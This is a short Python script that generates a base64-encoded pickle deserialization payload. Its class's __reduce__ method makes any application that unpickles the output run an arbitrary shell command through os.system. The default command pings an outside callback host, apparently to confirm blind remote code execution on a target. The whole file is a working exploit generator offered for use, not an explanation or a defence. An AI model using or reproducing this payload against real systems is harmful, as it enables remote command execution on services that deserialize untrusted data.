#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import cPickle
import sys
import base64

DEFAULT_COMMAND = "ping -c 4 here.a11829a0c8bd2f12b763.d.zhack.ca"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
